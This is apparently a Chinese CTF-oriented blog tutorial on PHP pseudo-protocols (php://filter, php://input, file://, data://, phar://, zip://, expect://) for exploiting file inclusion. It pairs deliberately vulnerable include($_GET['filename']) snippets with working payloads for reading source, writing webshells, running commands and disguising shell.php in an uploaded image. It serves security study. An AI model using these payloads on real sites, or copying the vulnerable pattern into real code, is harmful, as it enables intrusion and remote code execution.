---
title: php伪协议
date: 2022-01-21 18:14:55
tags:
      - php
      - 文件包含
      - php伪协议
      - ctf
      - web
categories: php
---

# php伪协议

PHP带有很多内置URL风格的封装协议,可用于fopen,copy,file_exists和filesize等文件系统函数.除了这些内置封装协议,还能通过stream_wrapper_register注册自定义的封装协议,这些协议都被称为伪协议<!--more-->

![image-20220121184629529](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121184629529.png)

常见的php伪协议如下:



- **php:// 访问各个输入输出流**
- file://  访问本地文件系统
- http://访问HTTP(S)网址
- tfp://访问FTP(S)URLzlib://处理压缩流
- data://读取数据
- glob://查找匹配的文件路径模式
- phar:// PHP归档
- ssh2:// Secure Shell2
- rar:// RAR数据压缩
- ogg:// 处理音频流
- expect:// 处理交互式的流

### 1.php://伪协议

#### php://filter

##### 参数列表

![image-20220121183621592](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121183621592.png)

示例代码:

`?filename=php://filter/read=convert.base64-encode/resource=xxx.php`  

或者

`?filename=php://filter/convert.base64-encode/resource=xxx.php`

#### php://input

php://input可以访问请求的原始数据的只读流,即可以直接读取POST上没有经过解析的原始数据,<label style="background:yellow">但是使用entype="multipart/form-data"(form表单的一个可选参数)的时候php://input是无效的</label>

***php://input有以下三种用法***

##### 1)读取POST数据   

php://input可以直接读取POST上没有经过解析的原始数据利用php://input读取POST数据时,PHP配置文件不需要开启`allow_url_fopen`和`allow_url_include`示例代码如下

```php
<?php
$data=file_get_contents("php://input");
echo $data;
?>
```

##### 2)写入木马

<label style="background:yellow">利用php://input写入木马时,PHP配置文件需要开启allow_url_include,不需要开启allow_url_fopen</label>

如果不开启allow_url_include则会报错

如果POST传入的数据时PHP代码,就可以写入木马

示例代码如下

```php
<?php
$filename=$_GET['filename'];
include($filename);
?>
```

![image-20220121184145894](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121184145894.png)

访问shell.php即可查看是否写入成功

##### 3)执行命令

<label style="background:yellow">利用php://input执行命令时,PHP配置文件需开启allow_url_include,不需要开启allow_url_fopen</label>

如果post传入的数据是PHP代码,就可以执行任意代码,如果次PHP代码调用了系统函数,就可以执行命令

示例代码如下

```php
<?php
$filename=$_GET['filename'];
include($filename);
?>
```

![image-20220121184329051](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121184329051.png)

### 2.file://伪协议

file://伪协议可以访问`本地文件系统`,读取文件的内容

利用file://时,PHP配置文件不需要开启allow_url_fopen和allow_url_include

`?filename=file://c:/boot.ini`

file://伪协议示例代码如下:

```php
<?php
$filename=$_GET['filename'];
include($filename);
?>
```

### 3.data://伪协议

自PHP5.2.0起,数据流封装器开始有效,主要用于数据流的读取,如果传入的数据是php代码,就会执行任意代码使用方法如下:

data://text/plain;base64,xxxxxxxxx(base64编码后的数据)

利用data://时,PHP配置文件需开启allow_url_include和allow_url_fopen

data://伪协议示例代码如下

```php
<?php
    $filename=$_GET['filename'];
	include($filename);
?>
```

通过data://伪协议传送`<?php phpinfo();?>`代码的base64编码,这样就可以执行代码

`?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b`

注意点:要对`+`进行手动url编码为%2b![img](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/Image(17).png)





### 4.phar://伪协议

phar://是用来进行解压的伪协议,phar://参数中的文件不管是什么扩展名都会被当作压缩包

用法如下:

?file=phar://压缩包/内部文件

`phar://xxx.png/shell.php`

利用phar://时,PHP的版本应高于5.3.0,PHP配置文件需开启`allow_url_include`和`allow_url_fopen`

注意:压缩包需要使用zip://伪协议压缩,而不能用rar://伪协议压缩.将木马文件压缩后,改为其他任意格式的文件都可以正常使用

示例代码如下:

```php
<?php
$filename=$_GET['filename'];
include($filename);
?>
```

利用步骤:通常phar://伪协议用在有上传功能的网站中,写一个木马文件shell.php,然后用zip://伪协议压缩为shell.zip,

![image-20220121183215673](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121183215673.png)

phar://伪协议把shell.png当做zip文件解压并访问其中的shell.php文件,执行了shell.php文件中的代码

再将扩展名改为.png等,上传到网站

### 5.zip://伪协议

zip://伪协议和phar://伪协议在原理上类似,但是用法不一样

用法如下:(在浏览器中#要手动转换成url编码%23)

`?filename=zip://xxx.png#shell.php`

示例代码如下:

```php
<?php
$filename=$_GET['filename'];
include($filename);
?>
```

![image-20220121184409047](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220121184409047.png)

### 6.expect://伪协议

expect://伪协议主要用来执行系统命令,但是需要安装扩展

用法如下:

`?filename=expect://ls`
